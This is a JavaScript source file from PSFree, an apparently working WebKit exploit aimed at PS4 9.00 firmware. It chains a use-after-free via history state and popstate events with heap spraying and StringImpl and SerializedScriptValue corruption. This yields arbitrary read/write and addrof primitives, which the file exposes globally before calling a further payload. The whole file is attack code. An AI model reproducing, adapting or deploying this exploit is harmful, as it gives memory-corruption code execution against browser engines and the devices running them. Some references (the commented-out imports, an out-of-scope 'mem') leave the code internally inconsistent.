/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// import * as config from './config.mjs';

// import {
//     read32,
//     read64,
//     write32,
//     write64,
//     sread64,
// } from './module/rw.mjs';

// import * as o from './module/offset.mjs';

// import { Int } from './module/int64.mjs';
// import { Memory } from './module/mem.mjs';

// import {
//     die,
//     debug_log,
//     clear_log,
//     str2array,
// } from './module/utils.mjs';

// const ssv_len = (() => {
//     switch (config.target) {
//         case config.ps4_6_00: {
//             return 0x58;
//         }
//         case config.ps4_9_00: {
//             return 0x50;
//         }
//         case config.ps4_6_50:
//         case config.ps4_8_03: {
//             return 0x48;
//         }
//         default: {
//             throw RangeError('invalid config.target: ' + config.target);
//         }
//     }
// })();


const ps4_9_00 = 2;
const target = ps4_9_00;
const ssv_len = 0x50;


const num_reuse = 0x4000;


// # offset.mjs
const js_butterfly = 0x8;

// offsets for JSC::JSArrayBufferView
const view_m_vector = 0x10;
const view_m_length = 0x18;
const view_m_mode = 0x1c;

// sizeof JSC::JSArrayBufferView
const size_view = 0x20;

// offsets for WTF::StringImpl
const strimpl_strlen = 4;
const strimpl_m_data = 8;
const strimpl_inline_str = 0x14;

// sizeof WTF::StringImpl
const size_strimpl = 0x18;
// # end



// size of JSArrayBufferView
const original_strlen = ssv_len - size_strimpl;
const buffer_len = 0x20;

// make sure this is large enough to ensure that enough strings will
// occupy any gaps in in the relative read area so when are trying to leak the
// JSArrayBufferView we won't hit any unmapped areas
const num_str = 0x4000;
const num_gc = 30;
const num_space = 19;
const original_loc = window.location.pathname;
const loc = original_loc + '#foo';


// this variable has to be global for the leak to work
let rstr = null;
// this variable has to be global so that the exploit is more likely to succeed
let view_leak_arr = [];
// These variables need to be global because we theorize there are
// optimizations between local and global variables.
// We don't know what optimizations these are but it is messing with us.

// contents of the JSArrayBufferView
// 3rd element is the address of the buffer of the JSArrayBufferView
let jsview = [];

// object for saving values
let s1 = {views : []};
let view_leak = null;


let input = document.body.appendChild(document.createElement("input"));
input.style.position = "absolute";
input.style.top = "-100px";
let foo = document.body.appendChild(document.createElement("a"));
foo.id = "foo";



// The theory is that the allocator and garbage collector (GC) cooperate in
// serving allocation requests. The GC knows if there are any garbage that can
// be collected, to free up memory for requests. If the allocator can't serve a
// request, it will ask the GC to perform a garbage collection.
//
// If even after a garbage colllection, there is still no memory left for
// allocation, then the process will request the operating system to increase
// its heap size.
//
// We loop a couple of times by num_loop in allocating memory and dropping
// references to it. Even though we dropped the references immediately, memory
// consumption will still grow, since garbage is not immediately collected.
// Hopefully one of the requests will force the allocator to yield to the GC.
let pressure = null;
function gc(num_loop) {
   pressure = Array(100);
   for (let i = 0; i < num_loop; i++) {
       for (let i = 0; i < pressure.length; i++) {
           pressure[i] = new Uint32Array(0x40000);
       }
       pressure = Array(100);
   }
   pressure = null;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function prepare_uaf() {
    // don't want any state0 near state1
    history.pushState('state0', '');
    for (let i = 0; i < num_space; i++) {
        history.replaceState('state0', '');
    }

    history.replaceState("state1", "", loc);

    // don't want any state2 near state1
    history.pushState("state2", "");
    for (let i = 0; i < num_space; i++) {
        history.replaceState("state2", "");
    }
}

function free(save) {
    // We replace the URL with the original so the user can rerun the exploit
    // via a reload. If we don't then the exploit will append another "#foo" to
    // the URL and the input element will not be blurred because the foo
    // element won't be scrolled to during history.back().
    history.replaceState('state3', '', original_loc);

    for (let i = 0; i < num_reuse; i++) {
        let view = new Uint8Array(new ArrayBuffer(ssv_len));
        for (let i = 0; i < view.length; i++) {
            view[i] = 0x41;
        }
        save.views.push(view);
    }
}

function check_spray(views) {
    if (views.length !== num_reuse) {
        debug_log(`views.length: ${views.length}`);
        die('views.length !== num_reuse, restart the entire exploit');
    }

    for (let i = 0; i < num_reuse; i++) {
        if (views[i][0] !== 0x41) {
            return i;
        }
    }
    return null;
}

async function use_after_free(pop_func, save) {
    const pop_promise = new Promise((resolve, reject) => {
        function pop_wrapper(event) {
            try {
                pop_func(event, save);
            } catch (e) {
                reject(e);
            }
            resolve();
        }
        addEventListener("popstate", pop_wrapper, {once:true});
    });

    prepare_uaf();

    let num_free = 0;
    function onblur() {
        if (num_free > 0)  {
            die('multiple free()s, restart the entire exploit');
        }
        free(save);
        num_free++;
    }

    
    input.onblur = onblur;
    await new Promise((resolve) => {
        input.addEventListener('focus', resolve, {once:true});
        input.focus();
    });
    history.back();
    
    await pop_promise;
}

// get arbitrary read
async function setup_ar(save) {
    const view = save.ab;

    // set refcount to 1, all other fields to 0/NULL
    view[0] = 1;
    for (let i = 1; i < view.length; i++) {
        view[i] = 0;
    }

    delete save.views;
    delete save.pop;
    gc(num_gc);
    // debug_log('setup_ar() gc done');

    // Extra sleep if the object hasn't been collected yet, this is to allow
    // the garbage collector to preempt us. Keeping the call to gc() lowers the
    // average total sleep time.
    let total_sleep = 0;
    const num_sleep = 8;
    // Don't sleep for 9.xx. Tests show it is slower. This check and the sleep
    // before double_free() make setup_ar() fast for 9.xx.
    while (true && target !== ps4_9_00) {
        await sleep(num_sleep);
        total_sleep += num_sleep;

        if (view[0] !== 1) {
            break;
        }
    }
    // debug_log(`total_sleep: ${total_sleep}`);
    // log to check if the garbage collector did collect PopStateEvent
    // must not log "1, 0, 0, 0, ..."
    // debug_log(view);

    let num_spray = 0;
    while (true) {
        const obj = {};
        num_spray++;

        for (let i = 0; i < num_str; i++) {
            let str = new String(
                'B'.repeat(original_strlen - 5)
                + i.toString().padStart(5, '0')
            );
            obj[str] = 0x1337;
        }

        if (view[strimpl_inline_str] === 0x42) {
            write32(view, strimpl_strlen, 0xffffffff);
        } else {
            continue;
        }

        let found = false;
        const str_arr = Object.getOwnPropertyNames(obj);
        for (let i = 0; i < str_arr.length; i++) {
            if (str_arr[i].length > 0xff) {
                rstr = str_arr[i];
                found = true;
                // debug_log('confirmed correct leaked');
                // debug_log(`str len: ${rstr.length}`);
                // debug_log(view);
                // debug_log(`read address: ${read64(view, strimpl_m_data)}`);
                break;
            }
        }
        if (!found) {
            continue;
        }

        // debug_log(`num_spray: ${num_spray}`);
        return;
    }
}

async function double_free(save) {
    const view = save.ab;

    await setup_ar(save);

    // Spraying JSArrayBufferViews
    // debug_log('spraying views');
    let buffer = new ArrayBuffer(buffer_len);
    let tmp = [];
    const num_alloc = 0x10000;
    const num_threshold = 0xfc00;
    const num_diff = num_alloc - num_threshold;
    for (let i = 0; i < num_alloc; i++) {
        // The last allocated are more likely to be allocated after our relative read
        if (i >= num_threshold) {
            view_leak_arr.push(new Uint8Array(buffer));
        } else {
            tmp.push(new Uint8Array(buffer));
        }
    }
    tmp = null;
    // debug_log('done spray views');

    // Force JSC ref on FastMalloc Heap
    // https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
    let props = [];
    for (let i = 0; i < num_diff; i++) {
        props.push({ value: 0x43434343 });
        props.push({ value: view_leak_arr[i] });
    }

    // debug_log('start find leak');
    //
    // /!\
    // This part must avoid as much as possible fastMalloc allocation
    // to avoid re-using the targeted object
    // /!\
    //
    // Use relative read to find our JSC obj
    // We want a JSArrayBufferView that is allocated after our relative read
    search: while (true) {
        Object.defineProperties({}, props);
        for (let i = 0; i < 0x800000; i++) {
            let v = null;
            if (rstr.charCodeAt(i) === 0x43 &&
                rstr.charCodeAt(i + 1) === 0x43 &&
                rstr.charCodeAt(i + 2) === 0x43 &&
                rstr.charCodeAt(i + 3) === 0x43
            ) {
                // check if PropertyDescriptor
                if (rstr.charCodeAt(i + 0x08) === 0x00 &&
                    rstr.charCodeAt(i + 0x0f) === 0x00 &&
                    rstr.charCodeAt(i + 0x10) === 0x00 &&
                    rstr.charCodeAt(i + 0x17) === 0x00 &&
                    rstr.charCodeAt(i + 0x18) === 0x0e &&
                    rstr.charCodeAt(i + 0x1f) === 0x00 &&
                    rstr.charCodeAt(i + 0x28) === 0x00 &&
                    rstr.charCodeAt(i + 0x2f) === 0x00 &&
                    rstr.charCodeAt(i + 0x30) === 0x00 &&
                    rstr.charCodeAt(i + 0x37) === 0x00 &&
                    rstr.charCodeAt(i + 0x38) === 0x0e &&
                    rstr.charCodeAt(i + 0x3f) === 0x00
                ) {
                    v = str2array(rstr, 8, i + 0x20);
                // check if array of JSValues pointed by m_buffer
                } else if (rstr.charCodeAt(i + 0x10) === 0x43 &&
                    rstr.charCodeAt(i + 0x11) === 0x43 &&
                    rstr.charCodeAt(i + 0x12) === 0x43 &&
                    rstr.charCodeAt(i + 0x13) === 0x43) {
                    v = str2array(rstr, 8, i + 8);
                }
            }
            if (v !== null) {
                view_leak = new Int(v);
                break search;
            }
        }
    }
    //
    // /!\
    // Critical part ended-up here
    // /!\
    //
    // debug_log('end find leak');
    // debug_log('view addr ' + view_leak);

    let rstr_addr = read64(view, strimpl_m_data);
    write64(view, strimpl_m_data, view_leak);
    for (let i = 0; i < 4; i++) {
        jsview.push(sread64(rstr, i*8));
    }
    write64(view, strimpl_m_data, rstr_addr);
    write32(view, strimpl_strlen, original_strlen);
    // debug_log('contents of JSArrayBufferView');
    // debug_log(jsview);
}

function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
    const old_m_data = read64(view_rstr, strimpl_m_data);

    let res = null;
    write64(view_rstr, strimpl_m_data, view_m_vector);
    for (const view of view_arr) {
        const magic = 0x41424344;
        write32(view, 0, magic);

        if (sread64(rstr, 0).low() === magic) {
            res = view;
            break;
        }
    }
    write64(view_rstr, strimpl_m_data, old_m_data);

    if (res === null) {
        die('not found');
    }
    return res;
}


class Reader {
    // leaker will be the view whose address we leaked
    constructor(rstr, view_rstr, leaker, leaker_addr) {
        this.rstr = rstr;
        this.view_rstr = view_rstr;
        this.leaker = leaker;
        this.leaker_addr = leaker_addr;
        this.old_m_data = read64(view_rstr, strimpl_m_data);

        // Create a butterfy with the "a" property as the first. leaker is a
        // JSArrayBufferView. Instances of that class don't have inlined
        // properties and the butterfly is immediately created.
        leaker.a = 0; // dummy value, we just want to create the "a" property
    }

    addrof(obj) {
        if (typeof obj !== 'object'
            && typeof obj !== 'function'
        ) {
            throw TypeError('addrof argument not a JS object');
        }

        this.leaker.a = obj;

        // no need to modify the length, original_strlen is large enough
        write64(this.view_rstr, strimpl_m_data, this.leaker_addr);

        const butterfly = sread64(this.rstr, js_butterfly);
        write64(this.view_rstr, strimpl_m_data, butterfly.sub(0x10));

        const res = sread64(this.rstr, 0);

        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }

    get_view_vector(view) {
        if (!ArrayBuffer.isView(view)) {
            throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
        }

        write64(this.view_rstr, strimpl_m_data, this.addrof(view));
        const res = sread64(this.rstr, view_m_vector);

        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }
}

// data to write to the SerializedScriptValue
//
// Setup to make deserialization create an ArrayBuffer with its buffer address
// pointing to a JSArrayBufferView (worker).
//
// TypedArrays (JSArrayBufferView) created via "new TypedArray(x)" where x <=
// 1000 (fastSizeLimit) have ther buffers allocated on the JavaScript heap
// (m_mode = FastTypedArray). Requesting the buffer property ("view.buffer")
// (calls possiblySharedBuffer()) of such a view will allocate a new buffer on
// the fastMalloc heap, the contents of the old one will be copied. This will
// change the m_vector field, so care must be taken if you cache the result of
// get_view_vector(), you must call it again to get the updated field.
//
// See enum TypedArrayMode from
// WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h and
// possiblySharedBuffer() from
// WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h at PS4 8.03.
function setup_ssv_data(reader) {
    const r = reader;
    // sizeof WTF::Vector<T>
    const size_vector = 0x10;
    // sizeof JSC::ArrayBufferContents
    const size_abc = target === ps4_9_00 ? 0x18 : 0x20;

    // WTF::Vector<unsigned char>
    const m_data = new Uint8Array(size_vector);
    const data = new Uint8Array(9);

    // m_buffer
    write64(m_data, 0, r.get_view_vector(data));
    // m_capacity
    write32(m_data, 8, data.length);
    // m_size
    write32(m_data, 0xc, data.length);

    // 6 is the serialization format version number for ps4 6.00. The format
    // is backwards compatible and using a value less than the current version
    // number used by a specific WebKit version is considered valid.
    //
    // See CloneDeserializer::isValid() from
    // WebKit/Source/WebCore/bindings/js/SerializedScriptValue.cpp at PS4 8.03.
    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    write32(data, 0, CurrentVersion);
    data[4] = ArrayBufferTransferTag;
    write32(data, 5, 0);

    // WTF::Vector<JSC::ArrayBufferContents>
    const abc_vector = new Uint8Array(size_vector);
    // JSC::ArrayBufferContents
    const abc = new Uint8Array(size_abc);

    write64(abc_vector, 0, r.get_view_vector(abc));
    write32(abc_vector, 8, 1);
    write32(abc_vector, 0xc, 1);

    // m_mode = WastefulTypedArray, allocated buffer on the fastMalloc heap,
    // unlike FastTypedArray, where the buffer is managed by the GC. This
    // prevents random crashes.
    //
    // See JSGenericTypedArrayView<Adaptor>::visitChildren() from
    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayViewInlines.h at
    // PS4 8.03.
    const worker = new Uint8Array(new ArrayBuffer(1));

    if (target !== ps4_9_00) {
        // m_destructor
        write64(abc, 0, Int.Zero);
        // m_shared
        write64(abc, 8, Int.Zero);
        // m_data
        write64(abc, 0x10, r.addrof(worker));
        // m_sizeInBytes
        write32(abc, 0x18, size_view);
    } else {
        // m_data
        write64(abc, 0, r.addrof(worker));
        // m_destructor (48 bits)
        write32(abc, 8, 0);
        write16(abc, 0xc, 0);
        // m_shared (48 bits)
        write32(abc, 0xe, 0);
        write16(abc, 0x12, 0);
        // m_sizeInBytes
        write32(abc, 0x14, size_view);
    }

    return {
        m_data,
        m_arrayBufferContentsArray : r.get_view_vector(abc_vector),
        worker,
        // keep a reference to prevent garbage collection
        nogc : [
            data,
            abc_vector,
            abc,
        ],
    };
}

// get arbitrary read/write
async function setup_arw(save, ssv_data) {
    const num_msg = 1000;
    const view = save.ab;
    let msgs = [];

    function onmessage(event) {
        msgs.push(event);
    }
    addEventListener('message', onmessage);

    // Free the StringImpl so we can spray SerializedScriptValues over the
    // buffer of the view. The StringImpl is safe to free since we fixed it up
    // earlier.
    rstr = null;
    while (true) {
        for (let i = 0; i < num_msg; i++) {
            postMessage('', origin);
        }

        while (msgs.length !== num_msg) {
            await sleep(100);
        }

        if (view[strimpl_inline_str] !== 0x42) {
            break;
        }

        msgs = [];
    }
    removeEventListener('message', onmessage);

    // debug_log('view contents:');
    // for (let i = 0; i < ssv_len; i += 8) {
    //     debug_log(read64(view, i));
    // }

    // save SerializedScriptValue
    const copy = [];
    for (let i = 0; i < view.length; i++) {
        copy.push(view[i]);
    }

    const {m_data, m_arrayBufferContentsArray, worker, nogc} = ssv_data;
    write64(view, 8, read64(m_data, 0));
    write64(view, 0x10, read64(m_data, 8));
    write64(view, 0x18, m_arrayBufferContentsArray);

    for (const msg of msgs) {
        if (msg.data !== '') {
            debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');


            const u = new Uint8Array(msg.data);
            // debug_log('deserialized ArrayBuffer:');
            // for (let i = 0; i < size_view; i += 8) {
            //     debug_log(read64(u, i));
            // }

            const mem = new Memory(u, worker);

            // restore SerializedScriptValue
            view.set(copy);

            // cleanup
            view_leak_arr = null;
            view_leak = null;
            jsview = null;
            input = null;
            foo = null;

            // Before s1.ab gets garbage collected and its underlying buffer
            // on the fastMalloc heap is freed, another object could be
            // allocated in the meantime. That object could be freed
            // prematurely once the GC occurs. This could corrupt the object
            // if another object is allocated in the same memory area.
            //
            // So we will keep s1 alive.

            return;
        }
    }
    die('no arbitrary r/w');
}

// Don't create additional references to rstr, use the global variable. This
// is to make dropping all its references easy (change the value of the global
// variable).
async function triple_free(
    save,
    // contents of the leaked JSArrayBufferView
    jsview,
    view_leak_arr,
    leaked_view_addr,
) {
    const leaker = find_leaked_view(rstr, save.ab, jsview[2], view_leak_arr);
    let r = new Reader(rstr, save.ab, leaker, leaked_view_addr);
    const ssv_data = setup_ssv_data(r);

    // r contains a reference to rstr, drop it for setup_arw()
    r = null;
    await setup_arw(save, ssv_data);
}

function pop(event, save) {
    let spray_res = check_spray(save.views);
    if (spray_res === null) {
        die('failed spray');
    } else {
        save.pop = event;
        save.ab = save.views[spray_res];
        // debug_log('ssv len: ' + ssv_len);
        // debug_log('view index: ' + spray_res);
        // debug_log(save.ab);
    }
}

// For some reason the input element is being blurred by something else (we
// don't know what) if we execute use_after_free() before the DOMContentLoaded
// event fires. The input must only be blurred by history.back(), which will
// change the focus from the input to the foo element.
async function get_ready() {
    // debug_log('readyState: ' + document.readyState);
    await new Promise((resolve, reject) => {
        if (document.readyState !== "complete") {
            document.addEventListener("DOMContentLoaded", resolve);
            return;
        }
        resolve();
    });
}

async function run_psfree() {
    debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
    await get_ready();

    debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
    await use_after_free(pop, s1);

    // we trigger the leak first because it is more likely to work
    // than if it were to happen during the second ssv smashing
    // on the ps4
    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
    // * keeps setup_ar()'s total sleep even lower
    // * also helps the garbage collector scheduling for 9.xx
    await sleep(0);
    await double_free(s1);

    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
    await triple_free(s1, jsview, view_leak_arr, view_leak);

    // clear_log();

    let prim = {
        read1(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read8(addr);
            return res;
        },

        read2(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read16(addr);
            return res;
        },

        read4(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read32(addr);
            return res;
        },

        read8(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read64(addr);
            return new int64(res.low(), res.high());
        },

        write1(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write8(addr, value);
        },

        write2(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write16(addr, value);
        },

        write4(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write32(addr, value);
        },

        write8(addr, value) {
            addr = new Int(addr.low, addr.hi);
            if (value instanceof int64) {
                value = new Int(value.low, value.hi);
                mem.write64(addr, value);
            } else {
                mem.write64(addr, new Int(value));
            }

        },

        leakval(obj) {
            const res = mem.addrof(obj);
            return new int64(res.low(), res.high());
        }
    };

    window.p = prim;
    run_hax();
}

